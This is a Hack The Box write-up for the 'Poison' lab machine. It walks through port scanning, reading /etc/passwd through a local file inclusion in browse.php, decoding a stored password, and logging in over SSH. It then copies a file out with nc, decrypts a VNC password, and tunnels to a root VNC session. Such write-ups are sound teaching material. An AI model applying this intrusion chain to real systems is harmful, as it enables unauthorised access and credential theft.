---
title: Hack The Box - Poison (Without Metasploit)
date: 2021-01-19 19:29:00 +0800
categories: [hackthebox]
tags: [linux, php, lfi, vnc]
image:
    path: /assets/images/poison.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.84 poison.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
rustscan --accessible -a poison.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.84:22
Open 10.10.10.84:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 04:47 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating Connect Scan at 04:47
Scanning poison.htb (10.10.10.84) [2 ports]
Discovered open port 80/tcp on 10.10.10.84
Discovered open port 22/tcp on 10.10.10.84
Completed Connect Scan at 04:47, 0.01s elapsed (2 total ports)
Initiating Service scan at 04:47
Scanning 2 services on poison.htb (10.10.10.84)
Completed Service scan at 04:47, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.84.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Nmap scan report for poison.htb (10.10.10.84)
Host is up, received user-set (0.0059s latency).
Scanned at 2021-01-19 04:47:52 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)`

![](/assets/images/poison1.png)

We see that this website allows you to test out the `PHP` scripts that exist on the webserver: `ini.php, info.php, listfiles.php, phpinfo.php`.

When we input `listfiles.php`, it brings us to `/browse.php?file=listfiles.php`.

```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

We see that there was an additional file called `pwdbackup.txt`. Since it exists in the directory of `browse.php`, we can go to `/pwdbackup.txt` to view its contents.

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

It says that it was encoded at least 13 times! Lets use `cyberchef` to decode it.

![](/assets/images/poison2.png)

We get the password `Charix!2#4%6&8(0`. But whose password is this? 

Going back to `/browse.php?file=listfiles.php`, it looks like the URL is `include`'ing the file name provided in the `file` parameter. If we put `/etc/passwd` as the parameter, we get its contents! 

![](/assets/images/poison3.png)

At its tail, we see that there is a user called `charix`! Lets try using the password we found earlier to login as `charix`.

```bash
$ ssh charix@poison.htb
The authenticity of host 'poison.htb (10.10.10.84)' can't be established.
ECDSA key fingerprint is SHA256:rhYtpHzkd9nBmOtN7+ft0JiVAu8qnywLb48Glz4jZ8c.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'poison.htb,10.10.10.84' (ECDSA) to the list of known hosts.
Password for charix@Poison: 
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

...

Edit /etc/motd to change this login announcement.
Forget what directory you are in? Type "pwd".
                -- Dru <genesis@istar.ca>
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
```

# user.txt

The user flag is in `charix`'s home directory.

```bash
charix@Poison:~ % cat user.txt
eaacXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

In `charix`'s home directory, there was a file called `secret.zip`.

```bash
charix@Poison:~ % ls
secret.zip      user.txt
```

There was some issues unzipping on the machine, so I transferred it over using `nc`. It was password-protected, but fortunately the password of `charix` was correct.

```bash
$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
  extracting: secret
$ xxd secret    
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

The contents of `secret` was jibberish and I could'nt make anything out of it. Moving on, when I ran `ps aux` to view the processes that are actively running,

```bash
charix@Poison:~ % ps aux | grep root
...
root     529  0.0  0.9  23620  9032 v0- I    05:42     0:00.31 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root     540  0.0  0.7  67220  7108 v0- I    05:42     0:00.12 xterm -geometry 80x24+10+10 -ls -title X Desktop
...
```

I see that there is a `VNC` process running as `root`! We could also see that `VNC` ports (5900+) are open but on the `localhost` inteface.

```bash
charix@Poison:~ % netstat -an
Active Internet connections (including servers)  
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)  
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
...
```

However, we are going to need a password! Remember the `secret` file we found? Turns out it contains the encrypted version of the `VNC` password! We can use [this](https://github.com/jeroennijhof/vncpwd) to help us retrieve the password.

```bash
$ ./vncpwd ../secret
Password: VNCP@$$!
```

We could also specify the `secret` file when we `VNC` in too! Now, we can move on to making the `VNC` port accessible to us by `SSH` portforwarding.

```bash
charix@Poison:~ % ssh -L 10.10.10.84:37777:127.0.0.1:5901 charix@127.0.0.1
Password for charix@Poison:
```

We can `VNC` in with the `secret` file or we could enter the `VNC` password we found.

```bash
$ vncviewer -passwd secret poison.htb::37777  
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
...
```

![](/assets/images/poison4.png)

Copying out the flag was a challenge, so I switched to `sh` shell and started a reverse shell with `nc`.

![](/assets/images/poison5.png)

# root.txt

The root flag is in `root`'s home directory.

```bash
cat root.txt
716dXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


### Rooted ! Thank you for reading and look forward for more writeups and articles !